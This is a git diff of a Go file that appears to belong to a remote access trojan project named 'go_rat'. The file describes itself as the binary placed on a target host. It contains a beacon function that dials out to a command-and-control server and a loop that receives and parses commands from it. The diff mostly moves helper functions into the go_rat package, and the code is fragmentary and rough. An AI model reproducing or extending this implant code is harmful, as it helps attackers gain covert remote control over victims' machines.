@@ -2,16 +2,12 @@
 This is the file that will be compiled into the binary
 	that gets placed on the target host
 /*/
-// we have to name the module after the folder it's in
 package target_binary
 
 // import the libraries we need
 import (
 	"bufio"
-	"encoding/json"
 	"fmt"
-
-	//"go_rat"
 
 	/*/
 	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
@@ -26,39 +22,12 @@ import (
 	"strings"
 )
 
-//
-// This function of for extracting messages sent in json into the
-// Command type
-// This gets placed in a loop to handle net.Conn type
-// containing json AFTER AUTH
-func json_extract(text string, command_struct go_rat.Command) {
-	/*/
-		use Unmarshal if we expect our data to be pure JSON
-		second parameter is the address of the struct
-		we want to store our arsed data in
-	/*/
-	error_printer("wat")
-	json.Unmarshal([]byte(text), &command_struct)
-
-}
-
-/*/
-Function for packing up a string to send down the wire to the command and control
-/*/
-func json_pack(json_string string, outgoing_message go_rat.OutgoingMessage) []byte {
-	encoded_json, err := json.Marshal(json_string)
-	if err != nil {
-		error_printer(err, "[-] Problem with JSON packing function")
-	}
-	return encoded_json
-}
-
 // Beacon
 // makes requests outside the network to get to the C&C
 // ONLY used for reaching out
 func Bacon() {
-	go_rat.PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
-	net.DialTCP("tcp", &local_tcpaddr_LAN, &PHONEHOME_TCP)
+	go_rat.PHONEHOME_TCP.IP = net.IP(go_rat.Remote_tcpaddr)
+	net.DialTCP("tcp", &go_rat.Local_tcpaddr_LAN, &go_rat.PHONEHOME_TCP)
 }
 
 /*
@@ -73,7 +42,7 @@ var new_command_for_q go_rat.Command
 
 // function to provide outbound connections via threading
 //-----------------Local IP---------Remote IP---------PORT-------
-func tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
+func Tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 	// the network functions return two objects
 	// a connection
 	// and an error
@@ -82,7 +51,7 @@ func tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 	// if error isnt empty/null/nothingness
 	if err != nil {
 		// print the error
-		error_printer(err, "[-] Error: TCP Connection Failed")
+		go_rat.Error_printer(err, "[-] Error: TCP Connection Failed")
 		return
 	}
 	// if there was no error, continue to the control loop
@@ -96,7 +65,7 @@ func tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
 			fmt.Println(error)
 			return
 		}
-		json_extract(netData, new_command_for_q)
+		go_rat.Json_extract(netData, new_command_for_q)
 		// stops server if "STOP" Command is sent
 		// TODO: JSONIFY THIS
 		if strings.TrimSpace(string(netData)) == "STOP" {
@@ -114,7 +83,7 @@ this function will contain the logic to spawn threads
 of the following functions
 
 */
-func tcp_network_io() {
+func Tcp_network_io() {
 
 	//generic error printing
 	//if err != nil {
